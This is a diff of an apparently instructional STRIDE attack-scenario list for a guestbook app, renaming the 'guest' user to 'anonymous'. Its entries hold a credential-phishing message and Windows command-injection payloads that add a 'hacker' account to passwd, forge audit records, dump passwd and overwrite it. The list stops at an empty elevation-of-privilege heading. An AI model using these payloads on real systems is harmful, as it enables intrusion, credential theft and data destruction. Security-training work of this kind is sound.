@@ -1,34 +1,34 @@
 spoofing:
-    * login as guest
+    * login as anonymous
     * write following message:
         user: admin
         message: Please send your username and password to admin@guestbo0k.tw for verifying your accounts
 
 tampering:
-    * login as guest
+    * login as anonymous
     * write following message:
-        user: guest
-        message: >NUL && echo hacker:hacker >> passwd && echo User [guest] wrote: [hi from guest
+        user: anonymous
+        message: >NUL && echo hacker:hacker >> passwd && echo User [anonymous] wrote: [hi from anonymous
         
 repudiation:
     * try to login as user with incorrect password (audit entry should be added)
-    * login as guest
+    * login as anonymous
     * write following message:
-        user: guest
-        message: >NUL && date /T > audit && time /T >> audit && echo login for user [guest] was succeeded >> audit && echo User [guest] wrote: [hi from guest
+        user: anonymous
+        message: >NUL && date /T > audit && time /T >> audit && echo login for user [anonymous] was succeeded >> audit && echo User [anonymous] wrote: [hi from anonymous
 
 information disclosure: 
-    * login as guest
+    * login as anonymous
     * write following message:
-        user: guest
-        message: >NUL && type passwd && echo User [guest] wrote: [hi from guest
+        user: anonymous
+        message: >NUL && type passwd && echo User [anonymous] wrote: [hi from anonymous
     
 
 denial of service:
-    * login as guest
+    * login as anonymous
     * write following message:
-        user: guest
-        message: >NUL && echo passwd was broken > passwd && echo User [guest] wrote: [hi from guest
+        user: anonymous
+        message: >NUL && echo passwd was broken > passwd && echo User [anonymous] wrote: [hi from anonymous
         
         
 elevation of privilege:
